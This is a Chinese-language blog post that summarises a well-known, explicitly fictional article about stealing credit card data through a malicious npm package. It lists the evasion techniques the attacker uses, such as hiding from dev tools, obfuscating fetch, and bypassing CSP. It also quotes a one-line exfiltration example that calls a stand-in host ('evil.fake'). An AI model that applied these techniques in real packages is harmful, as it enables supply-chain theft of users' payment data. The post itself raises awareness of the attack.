<!DOCTYPE html>
<html lang="zh-CN">
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <link rel="shortcut icon" href="/img/favicon.ico">
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/fontello-embedded.css">

  
<link rel="stylesheet" href="/css/yewth-plus.css">

  <script>var clicky_site_ids = clicky_site_ids || []; clicky_site_ids.push(101303378);</script>
  <script async src="//static.getclicky.com/js"></script>
  <title>如何通过npm获取信用卡密码 | Mint's Bay</title>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Mint's Bay" type="application/atom+xml">
</head>

  <body>
    <div id="wrapper">
      <header id="page-header">
  <div id="header-title">
    <img id="logo" src="/img/logo.png" alt="logo" width="64" height="64" />
    <a href="/">Mint's Bay</a>
  </div>
  <div id="header-nav">
    <a href="https://www.artstation.com/yewmint" target="_blank" class="nav-item"><i class="icon-brush"></i> ArtStation</a>
    <a href="https://github.com/yewmint" target="_blank" class="nav-item"><i class="icon-github"></i> GitHub</a>
    <a href="/archives" class="nav-item"><i class="icon-box"></i> Archive</a>
    <!-- <a href="/atom.xml" class="nav-item"><i class="icon-rss"></i> Feed</a> -->
  </div>
</header>

      <div id="body-wrapper">
        <article class="article">
  <h1 id="-" class="article-title">
    如何通过npm获取信用卡密码
  </h1>
  <p class="article-date">
    <i class="icon-calendar-1"></i>
    2018-01-20
  </p>
  <p>在Hackernoon上看到一篇有趣的文章，一个黑客描写自己如何利用带病毒的npm包，获取大量用户的隐私信息。原文在<a target="_blank" rel="noopener" href="https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5">这里</a>。</p>
<a id="more"></a>

<p><img src="/images/get-credit-card-from-npm/pexels-sebastiaan-stam-1480690.webp" alt="hacker"></p>
<p>黑客的步骤如下：</p>
<ol>
<li>写一段恶意代码，偷取重要信息，发送到自己的服务器</li>
<li>写一个简单的工具，比如日志格式化，并加入恶意代码</li>
<li>上传到npm，对开源项目提交pr，将工具引入项目</li>
</ol>
<p>仅仅引入恶意代码，会很容易被发现。作者David用了相当多的奇技淫巧来<strong>绕过安全检查</strong>，最精彩的部分就在这里：</p>
<ul>
<li>dev tools打开时暂停活动</li>
<li>白天不活动</li>
<li>对于同一个用户，永不重复活动</li>
<li>1/7概率活动，即使清除cookies也难以重现</li>
<li>url和广告链接相似</li>
<li>传到npm和github上的代码不同</li>
<li>源码中package.min.js并不是由package.js导出</li>
<li>不包含任何敏感单词，如同fetch，利用字符位移等技术规避</li>
<li>使用EventSource代替fetch，防止fetch被监听</li>
<li>先测试是否有办法绕过CSP，再发送</li>
<li>修改form的action绕过CSP</li>
</ul>
<p>评论里面有更狠的：</p>
<blockquote>
<p>Any way to prevent outgoing connections through<br><code>window.open(&quot;evil.fake?q=$&#123;payload&#125;&quot;, &quot;_blank&quot;).close()</code><br>with CSP?</p>
</blockquote>
<p>David“仁慈”地给出了建议，如何规避自己的恶意代码：</p>
<ul>
<li>敏感页面不要使用任何外部代码，特别是第三方广告</li>
<li>使用iframe将敏感信息与其他部分隔离</li>
</ul>
<p>最搞笑的是，David给所有被黑过的网站一个机会，如果能防住他的攻击，就不会公布这些网站的名字：</p>
<blockquote>
<p>I will soon be posting my annual report for 2017 where I declare my income from stealing credit card numbers and selling them to gangsters in cool hats. I am required by law to show which websites I skimmed the most credit cards from — maybe yours is on the list?</p>
<p>Since I’m a classy guy, anyone on the list who has successfully blocked me from harvesting their data by January 12th will be spared the public shaming.</p>
</blockquote>
<p><img src="/images/get-credit-card-from-npm/pexels-nikhiel-cs-411227.webp" alt="hacker"></p>
<p>当然，这些都是虚构的。虽然一切都不是真的，但是看完依然一头冷汗，对不对？</p>
<p>人们习惯性地以为，开源代码是会被审查的，可惜这只是错觉。第三方库太多太杂，几乎没有人会去读源码。特别是二进制、压缩混淆后的库，很难确定它与源码是否统一。</p>
<p>计算机的世界没有银弹。</p>
<p>全文完</p>


  <div class="utterances-container">
    <script 
      src="https://utteranc.es/client.js" 
      repo="yewmint/blog-comment" 
      issue-term="如何通过npm获取信用卡密码"
      theme="github-light" 
      crossorigin="anonymous" 
      async>
    </script>
  </div>
</article>
      </div>
      <footer>
  <div class="footer">
    LICENSE: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
    <i class="icon-cc"></i>
    <i class="icon-cc-by"></i>
    <i class="icon-cc-nc"></i>
    <i class="icon-cc-sa"></i>
  </div>
</footer>

    </div>
  </body>
</html>
